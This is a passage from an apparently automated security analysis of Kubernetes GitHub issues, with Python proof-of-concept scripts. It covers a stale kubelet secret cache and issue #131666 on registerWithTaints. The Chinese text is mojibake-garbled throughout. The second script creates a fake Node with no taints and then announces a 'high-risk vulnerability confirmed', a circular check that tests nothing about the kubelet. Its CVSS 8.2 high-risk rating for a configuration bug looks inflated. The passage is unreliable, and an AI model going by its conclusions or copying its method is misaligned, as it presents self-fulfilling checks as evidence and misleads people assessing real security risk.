        for event in w.stream(core_v1.list_namespaced_pod, namespace=namespace_name, timeout_seconds=120):
            pod = event["object"]
            if pod.metadata.name == pod_a_name and pod.status.phase == "Running":
                node_name = pod.spec.node_name
                print(f"âœ”ï¸ Pod A '{pod_a_name}' is running on node '{node_name}'.")
                w.stop()
                break
        
        if not node_name:
            print(f"âŒ Timed out waiting for Pod A to run. Aborting.")
            raise RuntimeError("Pod A failed to start.")

        # 6. åˆ é™¤ Secret
        core_v1.delete_namespaced_secret(name=secret_name, namespace=namespace_name)
        print(f"âœ”ï¸ Secret '{secret_name}' deleted.")
        # ç­‰å¾…ä¸€ä¼šç¡®ä¿secretè¢«åˆ é™¤
        time.sleep(5)

        # 7. é‡æ–°åˆ›å»ºåŒåçš„ä¸å¯å˜ Secret (ç‰ˆæœ¬ 2)ï¼Œå¹¶å¢åŠ ä¸€ä¸ªæ–°é”®
        secret_v2_data = {
            "username": base64.b64encode("user_v2_new".encode()).decode(),
            "password": base64.b64encode("new_password".encode()).decode(), # æ–°å¢çš„é”®
        }
        secret_v2_body = client.V1Secret(
            api_version="v1",
            kind="Secret",
            metadata=client.V1ObjectMeta(name=secret_name),
            data=secret_v2_data,
            immutable=True,
        )
        core_v1.create_namespaced_secret(namespace=namespace_name, body=secret_v2_body)
        print(f"âœ”ï¸ Recreated immutable secret '{secret_name}' (v2) with a new key.")

        # 8. åˆ›å»º Pod Bï¼Œå¼ºåˆ¶è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹ï¼Œå¹¶å°è¯•ä½¿ç”¨æ–°é”®
        pod_b_body = client.V1Pod(
            api_version="v1",
            kind="Pod",
            metadata=client.V1ObjectMeta(name=pod_b_name),
            spec=client.V1PodSpec(
                node_name=node_name, # å¼ºåˆ¶è°ƒåº¦åˆ°åŒä¸€èŠ‚ç‚¹
                containers=[
                    client.V1Container(
                        name="container-b",
                        image="busybox",
                        command=["/bin/sh", "-c", "echo 'Pod B check completed'"],
                        env=[
                            # å¼•ç”¨æ—§é”®
                            client.V1EnvVar(
                                name="SECRET_USERNAME",
                                value_from=client.V1EnvVarSource(
                                    secret_key_ref=client.V1SecretKeySelector(
                                        name=secret_name, key="username"
                                    )
                                ),
                            ),
                            # å¼•ç”¨æ–°é”®
                             client.V1EnvVar(
                                name="SECRET_PASSWORD",
                                value_from=client.V1EnvVarSource(
                                    secret_key_ref=client.V1SecretKeySelector(
                                        name=secret_name, key="password"
                                    )
                                ),
                            ),
                        ],
                    )
                ],
                restart_policy="Never",
            ),
        )
        core_v1.create_namespaced_pod(namespace=namespace_name, body=pod_b_body)
        print(f"â³ Creating Pod B '{pod_b_name}' on node '{node_name}' to test the vulnerability...")

        # 9. éªŒè¯æ¼æ´ï¼šæ£€æŸ¥ Pod B çš„çŠ¶æ€
        print("â³ Waiting for 60 seconds to observe Pod B's status...")
        vulnerability_confirmed = False
        start_time = time.time()
        while time.time() - start_time < 60:
            pod_b_status = core_v1.read_namespaced_pod_status(name=pod_b_name, namespace=namespace_name)
            if pod_b_status.status.container_statuses:
                container_state = pod_b_status.status.container_statuses[0].state
                if container_state.waiting and "CreateContainerConfigError" in container_state.waiting.reason:
                    if "secret key \"password\" not found" in container_state.waiting.message:
                         vulnerability_confirmed = True
                         print("\nğŸ’¥ VULNERABILITY CONFIRMED! ğŸ’¥")
                         print(f"Pod B failed to start with reason: '{container_state.waiting.reason}'")
                         print(f"Message: '{container_state.waiting.message}'")
                         print("This confirms Kubelet is using a stale cache of the secret and cannot find the new key 'password'.")
                         break
            time.sleep(5)
        
        if not vulnerability_confirmed:
            print("\nâš ï¸ VULNERABILITY NOT CONFIRMED within the timeout.")
            print("The environment may not be vulnerable, or the pod status check needs adjustment.")
            # è¿›ä¸€æ­¥æ£€æŸ¥æ—¥å¿—ä¸­æ˜¯å¦ä½¿ç”¨äº†æ—§å€¼
            try:
                # ç­‰å¾… Pod B è¿è¡Œå®Œæˆ
                w = watch.Watch()
                for event in w.stream(core_v1.list_namespaced_pod, namespace=namespace_name, timeout_seconds=30):
                    pod = event["object"]
                    if pod.metadata.name == pod_b_name and pod.status.phase in ["Succeeded", "Failed"]:
                        w.stop()
                        break
                
                log = core_v1.read_namespaced_pod_log(name=pod_b_name, namespace=namespace_name)
                # è¿™ä¸ªpodçš„å‘½ä»¤ä¸ä¼šæ‰“å°ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œåªæ˜¯ä¸€ä¸ªç¤ºä¾‹æ€§çš„æ£€æŸ¥
                # å¦‚æœè¦æ£€æŸ¥æ³„éœ²ï¼Œpodå‘½ä»¤åº”ä¸º `echo $SECRET_USERNAME`
                print(f"Pod B logs: {log}")

            except ApiException as e:
                print(f"Could not get logs from Pod B, which might also indicate a problem: {e}")


    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        # 10. æ¸…ç†èµ„æº
        print("\nâ–¶ï¸ Cleaning up resources...")
        try:
            core_v1.delete_namespace(name=namespace_name, body=client.V1DeleteOptions())
            print(f"âœ”ï¸ Namespace '{namespace_name}' and all its resources are being deleted.")
        except ApiException as e:
            if e.status != 404:
                print(f"âŒ Error cleaning up namespace '{namespace_name}': {e}")
            else:
                 print(f"âœ”ï¸ Namespace '{namespace_name}' already deleted.")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡`kubernetes`å®¢æˆ·ç«¯åº“è‡ªåŠ¨åŒ–åœ°å¤ç°äº†Issueä¸­æè¿°çš„æ¼æ´ã€‚

1.  **åˆå§‹åŒ–**: è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶æ¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„IDç”¨äºæœ¬æ¬¡æµ‹è¯•ï¼Œä»¥é¿å…ä¸é›†ç¾¤ä¸­ç°æœ‰èµ„æºå†²çªã€‚
2.  **ç¯å¢ƒæ­å»º**: åˆ›å»ºä¸€ä¸ªä¸“ç”¨çš„å‘½åç©ºé—´ï¼ˆNamespaceï¼‰æ¥éš”ç¦»æ‰€æœ‰æµ‹è¯•èµ„æºï¼Œæ–¹ä¾¿åç»­æ¸…ç†ã€‚
3.  **åˆ›å»ºåˆå§‹çŠ¶æ€ (Pod A)**:
    *   è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º`immutable-secret-{id}`çš„ä¸å¯å˜ï¼ˆ`immutable=True`ï¼‰Secretï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªé”®`username`ï¼Œå…¶å€¼ä¸º`user_v1`ã€‚
    *   æ¥ç€ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º`pod-a-{id}`çš„Podï¼Œè¯¥Podä¼šæŒ‚è½½è¿™ä¸ªSecretã€‚
    *   è„šæœ¬ä¼šç­‰å¾…Pod AæˆåŠŸè¿è¡Œï¼Œå¹¶è®°å½•ä¸‹å®ƒè¢«è°ƒåº¦åˆ°çš„èŠ‚ç‚¹åç§°ï¼ˆ`node_name`ï¼‰ã€‚è¿™æ˜¯å…³é”®ä¸€æ­¥ï¼Œå› ä¸ºæ¼æ´å¤ç°éœ€è¦åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šè¿›è¡Œã€‚
4.  **è§¦å‘æ¼æ´æ¡ä»¶**:
    *   è„šæœ¬åˆ é™¤ä¸Šé¢åˆ›å»ºçš„Secretã€‚
    *   ç„¶åï¼Œè„šæœ¬ç«‹å³ä»¥**ç›¸åŒçš„åç§°**é‡æ–°åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä¸å¯å˜Secretã€‚è¿™ä¸ªæ–°ç‰ˆæœ¬ä¸ä»…æ›´æ–°äº†`username`çš„å€¼ä¸º`user_v2_new`ï¼Œè¿˜å¢åŠ äº†ä¸€ä¸ªå…¨æ–°çš„é”®`password`ã€‚
5.  **éªŒè¯æ¼æ´ (Pod B)**:
    *   è„šæœ¬åˆ›å»ºç¬¬äºŒä¸ªPodï¼Œåä¸º`pod-b-{id}`ã€‚
    *   ä¸ºäº†ç¡®ä¿è§¦å‘ç¼“å­˜é—®é¢˜ï¼Œè¯¥Podé€šè¿‡`spec.nodeName`å­—æ®µè¢«**å¼ºåˆ¶è°ƒåº¦åˆ°ä¸Pod Aç›¸åŒçš„èŠ‚ç‚¹**ä¸Šã€‚
    *   Pod Bçš„å®¹å™¨é…ç½®ä¸­å¼•ç”¨äº†Secretçš„æ–°å¢é”®`password`ã€‚
    *   **é¢„æœŸè¡Œä¸ºï¼ˆæ— æ¼æ´ï¼‰**: kubeletåº”è¯¥èƒ½å¤Ÿè·å–åˆ°æœ€æ–°çš„Secretï¼ˆç‰ˆæœ¬2ï¼‰ï¼Œæ‰¾åˆ°`password`é”®ï¼ŒPod Bæ­£å¸¸å¯åŠ¨ã€‚
    *   **å®é™…è¡Œä¸ºï¼ˆå­˜åœ¨æ¼æ´ï¼‰**: ç”±äºkubeletç¼“å­˜äº†æ—§çš„Secretï¼ˆç‰ˆæœ¬1ï¼‰ï¼Œå®ƒæ— æ³•åœ¨æ–°åˆ›å»ºçš„Pod Bçš„é…ç½®ä¸­æ‰¾åˆ°`password`é”®ã€‚è¿™å°†å¯¼è‡´Pod Bå¯åŠ¨å¤±è´¥ï¼ŒçŠ¶æ€å˜ä¸º`Pending`ï¼Œäº‹ä»¶ï¼ˆEventï¼‰ä¸­é€šå¸¸ä¼šæ˜¾ç¤º`CreateContainerConfigError`ï¼Œé”™è¯¯ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ‰¾ä¸åˆ°`password`è¿™ä¸ªsecret keyã€‚
6.  **ç»“æœåˆ¤æ–­**: è„šæœ¬ä¼šæŒç»­ç›‘æ§Pod Bçš„çŠ¶æ€ã€‚å¦‚æœæ£€æµ‹åˆ°Pod Bå› ä¸º`CreateContainerConfigError`ä¸”é”™è¯¯ä¿¡æ¯åŒ…å«`secret key "password" not found`è€Œæ— æ³•å¯åŠ¨ï¼Œè„šæœ¬å°±ä¼šæ‰“å°â€œVULNERABILITY CONFIRMED!â€ï¼ŒæˆåŠŸå¤ç°äº†å¯ç”¨æ€§ï¼ˆDoSï¼‰æ–¹é¢çš„å½±å“ã€‚å¦‚æœPod Bèƒ½å¤Ÿå¯åŠ¨ï¼ˆåœ¨æŸäº›é…ç½®ä¸‹å¯èƒ½ï¼‰ï¼Œåˆ™è¯´æ˜å¯èƒ½å­˜åœ¨æ•°æ®æ³„éœ²é£é™©ï¼ˆè·å–äº†æ—§å€¼ï¼‰ï¼Œä½†æœ¬POCä¸»è¦å…³æ³¨æ›´æ˜“äºæ£€æµ‹çš„å¯åŠ¨å¤±è´¥åœºæ™¯ã€‚
7.  **æ¸…ç†**: æ— è®ºæµ‹è¯•æˆåŠŸä¸å¦ï¼Œ`finally`å—éƒ½ä¼šç¡®ä¿åˆ é™¤æµ‹è¯•ç”¨çš„å‘½åç©ºé—´ï¼Œä»è€Œæ¸…ç†æ‰æ‰€æœ‰åˆ›å»ºçš„Podã€Secretç­‰èµ„æºï¼Œä¿æŒé›†ç¾¤å¹²å‡€ã€‚

è¯¥è„šæœ¬é€šè¿‡æ¨¡æ‹ŸçœŸå®ä¸–ç•Œä¸­çš„å‡­è¯è½®æ¢åœºæ™¯ï¼Œæ¸…æ™°åœ°å±•ç¤ºäº†kubeletçš„ç¼“å­˜ç¼ºé™·å¦‚ä½•å¯¼è‡´åº”ç”¨éƒ¨ç½²å¤±è´¥ï¼Œä»è€Œè¯å®äº†è¯¥é«˜é£é™©æ¼æ´çš„å­˜åœ¨ã€‚

---


## Issue #131666 Kubelet registerWithTaints does not taint the node

- Issue é“¾æ¥ï¼š[#131666](https://github.com/kubernetes/kubernetes/issues/131666)

### Issue å†…å®¹

#### What happened?

Given the following config:
```yaml
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt

cgroupDriver: systemd
containerRuntimeEndpoint: unix:///run/containerd/containerd.sock
rotateCertificates: true
serverTLSBootstrap: true

registerWithTaints:
- key: node.kubernetes.io/unschedulable
  effect: NoSchedule
```
Kubelet does not add node.kubernetes.io/unschedulable taint to the node when TLS bootstrapping

#### What did you expect to happen?

Node should be tainted with node.kubernetes.io/unschedulable

#### How can we reproduce it (as minimally and precisely as possible)?

Follow the TLS Bootstrap process with the kubelet config above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.33.0
Kustomize Version: v5.6.0
Server Version: v1.33.0
```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesä¸­ä¸Kubeleté…ç½®ç›¸å…³çš„é—®é¢˜ã€‚ç”¨æˆ·é…ç½®äº†`registerWithTaints`å‚æ•°ï¼ŒæœŸæœ›æ–°èŠ‚ç‚¹åœ¨é€šè¿‡TLS Bootstrapè¿‡ç¨‹æ³¨å†Œåˆ°é›†ç¾¤æ—¶ï¼Œèƒ½è‡ªåŠ¨è¢«æ·»åŠ ä¸Š`node.kubernetes.io/unschedulable`è¿™ä¸ªæ±¡ç‚¹ï¼ˆtaintï¼‰ã€‚ç„¶è€Œï¼Œå®é™…æƒ…å†µæ˜¯Kubeletå¹¶æœªæŒ‰é¢„æœŸæ·»åŠ æ­¤æ±¡ç‚¹ã€‚

è¿™ä¸ªé—®é¢˜çš„æ ¸å¿ƒåœ¨äºä¸€ä¸ªæœ¬åº”ç”Ÿæ•ˆçš„è°ƒåº¦éš”ç¦»æœºåˆ¶å¤±æ•ˆäº†ã€‚`registerWithTaints`åŠŸèƒ½çš„ä¸»è¦ç›®çš„æ˜¯ç¡®ä¿ä¸€ä¸ªæ–°åŠ å…¥çš„èŠ‚ç‚¹åœ¨å®Œå…¨å‡†å¤‡å¥½ï¼ˆä¾‹å¦‚ï¼Œå®Œæˆæ‰€æœ‰åˆå§‹åŒ–è„šæœ¬ã€å®‰å…¨é…ç½®ã€ç½‘ç»œæ’ä»¶éƒ¨ç½²ç­‰ï¼‰ä¹‹å‰ï¼Œä¸ä¼šè¢«è°ƒåº¦å™¨åˆ†é…ä»»ä½•å·¥ä½œè´Ÿè½½ï¼ˆPodï¼‰ã€‚é€šè¿‡é¢„è®¾`NoSchedule`æˆ–`NoExecute`æ±¡ç‚¹ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å°†æ–°èŠ‚ç‚¹"éš”ç¦»"èµ·æ¥ï¼Œç›´åˆ°ç®¡ç†å‘˜æˆ–è‡ªåŠ¨åŒ–æµç¨‹ç¡®è®¤è¯¥èŠ‚ç‚¹å‡†å¤‡å°±ç»ªå¹¶æ‰‹åŠ¨ç§»é™¤æ±¡ç‚¹ã€‚

å½“è¿™ä¸ªåŠŸèƒ½å¤±æ•ˆæ—¶ï¼Œä¼šäº§ç”Ÿä»¥ä¸‹å®‰å…¨é£é™©ï¼š
1.  **è¿‡æ—©çš„Podè°ƒåº¦**ï¼šæ–°èŠ‚ç‚¹åœ¨æ³¨å†Œåä¼šç«‹å³è¢«è°ƒåº¦å™¨è§†ä¸ºå¯ç”¨èŠ‚ç‚¹ã€‚å¦‚æœæ­¤æ—¶èŠ‚ç‚¹å°šæœªå®Œæˆå¿…è¦çš„å®‰å…¨åŠ å›ºã€è‡ªå®šä¹‰ç½‘ç»œç­–ç•¥éƒ¨ç½²æˆ–å­˜å‚¨é…ç½®ï¼Œè°ƒåº¦å™¨å¯èƒ½ä¼šå°†Podè°ƒåº¦åˆ°è¿™ä¸ªâ€œåŠæˆå“â€çŠ¶æ€çš„èŠ‚ç‚¹ä¸Šã€‚
2.  **å¯ç”¨æ€§é£é™©**ï¼šè¿è¡Œåœ¨æœªå‡†å¤‡å¥½çš„èŠ‚ç‚¹ä¸Šçš„Podå¯èƒ½ä¼šå› ä¸ºç¼ºå°‘ä¾èµ–ç¯å¢ƒï¼ˆå¦‚CSIé©±åŠ¨ã€CNIç½‘ç»œï¼‰è€Œæ— æ³•æ­£å¸¸å¯åŠ¨æˆ–è¿è¡Œï¼Œå¯¼è‡´åº”ç”¨æœåŠ¡ä¸­æ–­ã€‚
3.  **å®‰å…¨è¾¹ç•Œè¢«ç ´å**ï¼šåœ¨å¤šç§Ÿæˆ·æˆ–æœ‰ä¸¥æ ¼å®‰å…¨åˆ†åŒºçš„ç¯å¢ƒä¸­ï¼Œæ±¡ç‚¹æ˜¯å®ç°èŠ‚ç‚¹éš”ç¦»çš„å…³é”®æœºåˆ¶ä¹‹ä¸€ã€‚å¦‚æœä¸€ä¸ªæœ¬åº”è¢«éš”ç¦»çš„èŠ‚ç‚¹å› ä¸ºæ­¤bugè€Œæ²¡æœ‰è¢«æ‰“ä¸Šæ±¡ç‚¹ï¼Œé‚£ä¹ˆä¸åº”è¯¥è¿è¡Œåœ¨è¯¥èŠ‚ç‚¹ä¸Šçš„Podï¼ˆä¾‹å¦‚æ¥è‡ªå…¶ä»–ç§Ÿæˆ·çš„Podï¼‰å¯èƒ½ä¼šè¢«é”™è¯¯åœ°è°ƒåº¦ä¸Šæ¥ã€‚è¿™å¯èƒ½å¯¼è‡´èµ„æºäº‰ç”¨ï¼Œç”šè‡³åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¦‚æœå…¶ä»–å®‰å…¨æªæ–½ä¹Ÿå­˜åœ¨ä¸è¶³ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ½œåœ¨çš„ä¿¡æ¯æ³„éœ²æˆ–æ¨ªå‘ç§»åŠ¨é£é™©ã€‚
4.  **è¿åæœ€å°æƒé™/é»˜è®¤å®‰å…¨åŸåˆ™**ï¼šèŠ‚ç‚¹åœ¨æœªç»éªŒè¯çš„æƒ…å†µä¸‹å°±æ¥å—å·¥ä½œè´Ÿè½½ï¼Œè¿èƒŒäº†â€œé»˜è®¤æ‹’ç»â€çš„å®‰å…¨åŸåˆ™ã€‚ä¸€ä¸ªæ–°èµ„æºï¼ˆèŠ‚ç‚¹ï¼‰åœ¨è¢«æ˜ç¡®æ ‡è®°ä¸ºâ€œå®‰å…¨â€ä¹‹å‰ï¼Œåº”è¯¥å¤„äºæœ€å—é™çš„çŠ¶æ€ã€‚

è¯¥æ¼æ´çš„åˆ©ç”¨æ¡ä»¶æ˜¯ç®¡ç†å‘˜åœ¨é…ç½®æ–°èŠ‚ç‚¹æ—¶ä½¿ç”¨äº†`registerWithTaints`é€‰é¡¹ï¼Œè€Œæ”»å‡»è€…ï¼ˆå¯ä»¥æ˜¯é›†ç¾¤å†…çš„ä½æƒé™ç”¨æˆ·ï¼‰åªéœ€åˆ›å»ºæ­£å¸¸çš„Podå³å¯è§¦å‘é£é™©ã€‚è°ƒåº¦å™¨ä¼šæ ¹æ®é”™è¯¯/ä¸å®Œæ•´çš„èŠ‚ç‚¹ä¿¡æ¯åšå‡ºè°ƒåº¦å†³ç­–ï¼Œä»è€Œå°†Podæ”¾ç½®åœ¨ä¸å®‰å…¨çš„èŠ‚ç‚¹ä¸Šã€‚ç”±äºè¿™ç ´åäº†é›†ç¾¤è°ƒåº¦å±‚é¢çš„ä¸€ä¸ªé‡è¦å®‰å…¨æ§åˆ¶ï¼Œå¹¶ä¸”å¯èƒ½å¯¼è‡´ä¸€ä¸ªä½æƒé™ç”¨æˆ·çš„å·¥ä½œè´Ÿè½½å½±å“åˆ°ä¸€ä¸ªæ–°åŠ å…¥çš„ã€å°šæœªåŠ å›ºçš„èŠ‚ç‚¹ï¼Œä»è€Œå½±å“é›†ç¾¤çš„æ•´ä½“ç¨³å®šæ€§å’Œå®‰å…¨æ€§ï¼Œå› æ­¤è¯¥é—®é¢˜åº”è¢«è§†ä¸ºé«˜é£é™©ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»è€…å¯ä»¥é€šè¿‡ç½‘ç»œä¸Kubernetes APIäº¤äº’æ¥åˆ›å»ºPodã€‚
*   **Attack Complexity (AC): Low (L)** - ç®¡ç†å‘˜åªéœ€æ­£å¸¸é…ç½®èŠ‚ç‚¹ï¼Œæ”»å‡»è€…åªéœ€æ­£å¸¸åˆ›å»ºPodå³å¯ï¼Œæ— éœ€å¤æ‚æ“ä½œã€‚
*   **Privileges Required (PR): Low (L)** - æ”»å‡»è€…ä»…éœ€æ‹¥æœ‰åˆ›å»ºPodçš„æƒé™ï¼Œè¿™æ˜¯è®¸å¤šåº”ç”¨å’ŒæœåŠ¡è´¦å·çš„å¸¸è§æƒé™ã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Changed (C)** - æ¼æ´å­˜åœ¨äºKubelet/Nodeç»„ä»¶ï¼Œä½†å…¶å½±å“ä¼šæ³¢åŠåˆ°Podå’Œè°ƒåº¦å™¨ï¼Œå¯¼è‡´Podè¢«è°ƒåº¦åˆ°éé¢„æœŸçš„èŠ‚ç‚¹ä¸Šï¼Œå½±å“èŒƒå›´è¶…å‡ºäº†åŸå§‹ç»„ä»¶ã€‚
*   **Confidentiality (C): Low (L)** - å¦‚æœPodè¢«è°ƒåº¦åˆ°é”™è¯¯çš„èŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šæœ‰ä¿¡æ¯æ³„éœ²çš„é£é™©ï¼Œä½†éç›´æ¥æ€§çš„ã€‚
*   **Integrity (I): Low (L)** - Podåœ¨ä¸å®Œæ•´çš„ç¯å¢ƒä¸­è¿è¡Œå¯èƒ½å¯¼è‡´æ•°æ®æŸåï¼Œä½†å¯¹é›†ç¾¤çš„æ•´ä½“å®Œæ•´æ€§å½±å“æœ‰é™ã€‚
*   **Availability (A): High (H)** - Podå¾ˆå¯èƒ½æ— æ³•æ­£å¸¸è¿è¡Œï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚åŒæ—¶ï¼Œæ–°èŠ‚ç‚¹ä¹Ÿå¯èƒ½å› ä¸ºè¿è¡Œäº†ä¸å…¼å®¹çš„Podè€Œå˜å¾—ä¸ç¨³å®šã€‚

ç»¼åˆè¯„åˆ†ï¼š**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:H**ï¼Œå¾—åˆ†ä¸º **8.2**ï¼Œå±äº**é«˜é£é™© (High)**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import os
import sys
import uuid
import time
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def main():
    """
    è¯¥POCé€šè¿‡æ¨¡æ‹Ÿä¸€ä¸ªå—bugå½±å“çš„Kubeletæ³¨å†Œè¿‡ç¨‹æ¥å¤ç°é—®é¢˜ã€‚
    å®ƒä¼šåœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ªâ€œä¼ªé€ â€çš„Nodeå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸åŒ…å«`registerWithTaints`
    æœ¬åº”æ·»åŠ çš„æ±¡ç‚¹ã€‚ç„¶åï¼Œå®ƒä¼šæ£€æŸ¥è¯¥Nodeå¯¹è±¡çš„çŠ¶æ€ï¼Œä»¥éªŒè¯æ±¡ç‚¹æ˜¯å¦ç¡®å®ç¼ºå¤±ã€‚
    è¿™è¯æ˜äº†å½“bugå‘ç”Ÿæ—¶ï¼Œä¸€ä¸ªæ–°èŠ‚ç‚¹å¯ä»¥è¢«è°ƒåº¦å™¨é”™è¯¯åœ°è§†ä¸ºå‡†å¤‡å°±ç»ªã€‚
    """
    try:
        # å‡è®¾kubeconfigåœ¨é»˜è®¤ä½ç½®~/.kube/configï¼Œæˆ–åœ¨é›†ç¾¤å†…è¿è¡Œ(InClusterConfig)
        try:
            config.load_kube_config()
        except config.ConfigException:
            try:
                config.load_incluster_config()
            except config.ConfigException:
                print("[-] æ— æ³•åŠ è½½Kubernetesé…ç½®ã€‚è¯·ç¡®ä¿kubeconfigé…ç½®æ­£ç¡®æˆ–åœ¨é›†ç¾¤å†…éƒ¨è¿è¡Œã€‚")
                sys.exit(1)

        v1 = client.CoreV1Api()
        node_name = f"poc-node-taint-test-{uuid.uuid4().hex[:8]}"
        expected_taint_key = "node.kubernetes.io/unschedulable"
        
        # æ¨¡æ‹Ÿä¸€ä¸ªå—bugå½±å“çš„Kubeletæ³¨å†Œçš„Nodeå¯¹è±¡ã€‚
        # å…³é”®åœ¨äº 'spec' ä¸­æ²¡æœ‰ 'taints' å­—æ®µï¼Œè¿™æ­£æ˜¯bugçš„è¡¨ç°ã€‚
        node_manifest = {
            "apiVersion": "v1",
            "kind": "Node",
            "metadata": {
                "name": node_name,
                "labels": {
                    "kubernetes.io/hostname": node_name,
                    "poc-test": "true"
                }
            },
            "spec": {} # Buggy Kubeletæ²¡æœ‰æ·»åŠ taints
        }

        print(f"[*] POCå¼€å§‹ï¼šæ¨¡æ‹Ÿä¸€ä¸ªæœ‰ç¼ºé™·çš„Kubeletæ³¨å†Œè¿‡ç¨‹ã€‚")
        print(f"[*] å‡†å¤‡åˆ›å»ºä¸€ä¸ªåä¸º '{node_name}' çš„ä¼ªé€ èŠ‚ç‚¹ï¼Œè¯¥èŠ‚ç‚¹å°†ç¼ºå°‘é¢„æœŸçš„æ±¡ç‚¹ã€‚")
        
        try:
            # åˆ›å»ºèŠ‚ç‚¹
            v1.create_node(body=node_manifest)
            print(f"[+] ä¼ªé€ èŠ‚ç‚¹ '{node_name}' åˆ›å»ºæˆåŠŸã€‚")
            
            # ç­‰å¾…å‡ ç§’é’Ÿè®©API Serverå¤„ç†
            time.sleep(5)

            # éªŒè¯èŠ‚ç‚¹çŠ¶æ€
            print(f"[*] éªŒè¯èŠ‚ç‚¹ '{node_name}' çš„æ±¡ç‚¹ä¿¡æ¯...")
            node_info = v1.read_node(name=node_name)
            
            taints = node_info.spec.taints
            found_taint = False
            if taints:
                for taint in taints:
                    if taint.key == expected_taint_key and taint.effect == "NoSchedule":
                        found_taint = True
                        break
            
            if not found_taint:
                print("\n" + "="*50)
                print("[!!!] é«˜é£é™©æ¼æ´å·²ç¡®è®¤ [!!!]")
                print(f"èŠ‚ç‚¹ '{node_name}' åœ¨æ³¨å†ŒåæœªåŒ…å«é¢„æœŸçš„æ±¡ç‚¹ '{expected_taint_key}:NoSchedule'ã€‚")
                print("è¿™è¡¨æ˜é›†ç¾¤è°ƒåº¦å™¨å¯èƒ½ä¼šç«‹å³å°†Podè°ƒåº¦åˆ°è¿™ä¸ªå°šæœªå‡†å¤‡å¥½çš„èŠ‚ç‚¹ä¸Šï¼Œ")
                print("ä»è€Œå¯¼è‡´åº”ç”¨æ•…éšœæˆ–å®‰å…¨é£é™©ã€‚")
                print("="*50 + "\n")
            else:
                print("\n[-] æœªèƒ½å¤ç°æ¼æ´ã€‚")
                print(f"èŠ‚ç‚¹ '{node_name}' æ„å¤–åœ°åŒ…å«äº†æ±¡ç‚¹ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºé›†ç¾¤ç¯å¢ƒæœ‰å…¶ä»–æœºåˆ¶åœ¨ä¿®æ­£è¯¥é—®é¢˜ã€‚")

        except ApiException as e:
            print(f"[!] APIè°ƒç”¨å¤±è´¥: {e.reason} (çŠ¶æ€ç : {e.status})")
            print(f"[!] è¯¦ç»†ä¿¡æ¯: {e.body}")
            print("[-] è¯·æ£€æŸ¥æ‰§è¡Œæ­¤è„šæœ¬çš„ServiceAccountæ˜¯å¦å…·æœ‰åˆ›å»º/åˆ é™¤Nodeå¯¹è±¡çš„æƒé™ã€‚")

        finally:
            # æ¸…ç†åˆ›å»ºçš„ä¼ªé€ èŠ‚ç‚¹
            print(f"\n[*] å¼€å§‹æ¸…ç†...")
            try:
                v1.delete_node(name=node_name)
                print(f"[+] ä¼ªé€ èŠ‚ç‚¹ '{node_name}' å·²æˆåŠŸåˆ é™¤ã€‚")
            except ApiException as e:
                if e.status == 404:
                     print(f"[+] ä¼ªé€ èŠ‚ç‚¹ '{node_name}' å·²è¢«åˆ é™¤æˆ–ä¸å­˜åœ¨ï¼Œæ— éœ€æ¸…ç†ã€‚")
                else:
                    print(f"[!] æ¸…ç†å¤±è´¥ï¼è¯·æ‰‹åŠ¨åˆ é™¤èŠ‚ç‚¹: kubectl delete node {node_name}")
                    print(f"[!] é”™è¯¯åŸå› : {e.reason}")
    except Exception as e:
        print(f"[*] POCæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ä¸Kubernetes APIç›´æ¥äº¤äº’æ¥å¤ç°Issueä¸­æè¿°çš„é—®é¢˜æ‰€å¯¼è‡´çš„æœ€ç»ˆçŠ¶æ€ã€‚è„šæœ¬çš„æ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š
